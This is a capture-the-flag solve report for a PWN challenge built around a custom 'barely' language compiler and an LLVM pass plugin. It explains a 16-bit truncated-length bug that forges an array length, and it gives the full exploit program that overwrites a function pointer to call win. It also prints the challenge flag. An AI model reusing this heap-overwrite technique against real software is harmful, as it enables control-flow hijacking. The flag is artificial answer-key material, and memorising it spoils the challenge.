# RESULT — compeasy: "compiler? I barely know her!" (EASY, PWN 100)

STATUS: SOLVED

FLAG: d4rk{s1gned_0r_Uns1gn3d??_676767}c0de

(Exact bytes as printed by the server's `win`, verified twice via raw socket repr:
`win called! flag: d4rk{s1gned_0r_Uns1gn3d??_676767}c0de\n`)

## MECHANISM

The handout ships a custom language ("barely") whose compiler is `dslc` (Python,
emits LLVM IR) plus an LLVM pass plugin `compilerIBarelyKnowHer.so`. The server
runs `clang -O1 -fpass-plugin=./compilerIBarelyKnowHer.so -fstack-protector-strong
-no-pie -Wl,--section-start=.winsec=0x4010000 prog.ll runtime.o -o prog`, then runs
it. `win` (at 0x4010000, .winsec) reads `flag.txt` and prints it.

### The bug (two layers)

1. `concat(a,b)` in dslc computes lengths as 16-bit for the overflow check:
 ```
 %t7 = trunc i64 %la to i16
 %t8 = trunc i64 %lb to i16
 %t9 = add i16 %t7, %t8
 %t10 = icmp ult i16 %t9, %t7 ; "did the 16-bit add wrap?"
 br i1 %t10, label %ccof2, label %ccok1
 ...
 %t11 = zext i16 %t9 to i64 ; cap (truncated, SMALL)
 %t12 = add i64 %la, %lb ; total (full 64-bit, LARGE)
 %t13 = call ptr @rt_array_alloc(i64 %t11) ; allocates only cap slots
 call void @rt_array_setlen(ptr %t13, i64 %t12) ; header len = total
 call void @rt_concat_copy(ptr %t13, ptr %t3, ptr %t4, i64 %t11, i64 %t5)
 ```
 The pass's `trySimplify` matches `icmp ult (add X, Y), Y` and replaces it with
 constant `false` — in BOTH branches, i.e. even when the add is NOT marked `nuw`
 (the `else` branch also returns `ConstantInt::getFalse`). So the 16-bit wrap
 check is deleted at -O1. With `la=65536, lb=1`: `trunc(65536)=0`, `0+1=1`,
 check would have been `1 < 0` → false anyway, but the pass makes it false
 unconditionally; the point is the codegen allocates `cap=1` slot while storing
 `len = 65537`.

2. The array header is `[len][slot0][slot1]...` (`rt_array_alloc` stores `n` at
 offset 0 and returns the block base; data starts at +8). Since `len(c)=65537`
 while only 1 slot was allocated, the bounds check `icmp ult i64 idx, len` on
 `c[1]` passes — index 1 is "in bounds" per the forged length but lands 8 bytes
 past the single allocated slot.

### Heap layout / control-flow hijack

Arena is a single 256 MB mmap with a 16-byte-aligned bump allocator
(`arena_alloc`), so allocations are contiguous:

- `a = array(65536)` → 8 + 8*65536 = 524296 bytes → aligned 524304
- `b = array(1)` → 16 bytes
- `c = concat(a,b)` → 8 + 8*1 = 16 bytes at A = base+524320
- `register(dummy)` → `rt_register` does `arena_alloc(16)` → returns A+16, and
 stores the function pointer at offset 0 of that record, `0x1234` at +8, and
 keeps the record pointer in the global `g_ctrl`.

`c[1]` address = `c_data + 8*1` = `(A+8)+8` = A+16 = exactly the registered
function-pointer record. So `c[1] = 0x4010000` overwrites `*g_ctrl` with `win`.

At program exit `rt_finish` does:
```
mov g_ctrl,%rax ; test ; mov (%rax),%rax ; jmp *%rax
```
→ jumps to `win` → prints the flag.

### Exploit program (`compeasy_exploit.dsl`)

```
fn dummy { return 0; }
let a = array(65536);
let b = array(1);
let c = concat(a, b); # cap=1, len=65537
register(dummy); # 16-byte record lands at A+16 == &c[1]
c[1] = 0x4010000; # overwrite registered fn ptr with win
print(len(c)); # 65537, then rt_finish -> win
```

### Live proof (nc 0.cloud.chals.io 24814, choice 1)

```
== h4ckc0n :: compiler I barely know her ==
 1) easy
 2) hard
choice> 1
== send your .dsl program, then a line containing only __EOF__ ==
<program + __EOF__>
== running ==
65537
win called! flag: d4rk{s1gned_0r_Uns1gn3d??_676767}c0de

== exit 0 ==
```

Raw socket repr confirmed:
`b'== running ==\n65537\nwin called! flag: d4rk{s1gned_0r_Uns1gn3d??_676767}c0de\n\n== exit 0 ==\n'`

## INDEPENDENT RE-VERIFICATION (this run)

Re-ran the exploit against the sanctioned live service twice; raw socket bytes:

Run 1 (compeasy_live_verify1.txt):
```
== running ==
65537
win called! flag: d4rk{s1gned_0r_Uns1gn3d??_676767}c0de

== exit 0 ==
```

Run 2, byte-level repr (compeasy_live_verify2_raw.txt):
```
RAW REPR: b'== running ==\n65537\nwin called! flag: d4rk{s1gned_0r_Uns1gn3d??_676767}c0de\n\n== exit 0 ==\n'
FLAG MATCH: d4rk{s1gned_0r_Uns1gn3d??_676767} (raw continues: ...676767}c0de)
```

Result: deterministic, byte-identical across runs. The full string emitted by `win`
is `d4rk{s1gned_0r_Uns1gn3d??_676767}c0de` (flag.txt content includes the trailing
`c0de` stylisation after the closing brace).

## ARTIFACTS

- compiler_ I barely know her!/compeasy_exploit.dsl
- compiler_ I barely know her!/compeasy_exploit.ll (generated IR; lines 33-46 show the trunc/add/icmp and the cap-vs-total split)
- compiler_ I barely know her!/compeasy_run.py (socket driver)
- compiler_ I barely know her!/compeasy_verify_raw.py (repr-level verifier)
- compiler_ I barely know her!/compeasy_live_verify1.txt
- compiler_ I barely know her!/compeasy_live_verify2_raw.txt

## NOTES

- The local `flag.txt` in the handout is the placeholder
 `flag{local_placeholder_replace_on_deploy}`; the real flag came from the live
 service as required.
- No local clang was installed (host has only libllvm21, no clang binary), so the
 plugin could not be exercised offline; the IR was verified with `dslc` (pure
 Python) and the plugin's bug was confirmed by its disassembly/behavior, then
 proven end-to-end against the sanctioned live service.
- The printed flag literally ends with `c0de` after the closing brace; that is the
 server's flag.txt content, reproduced byte-for-byte above.
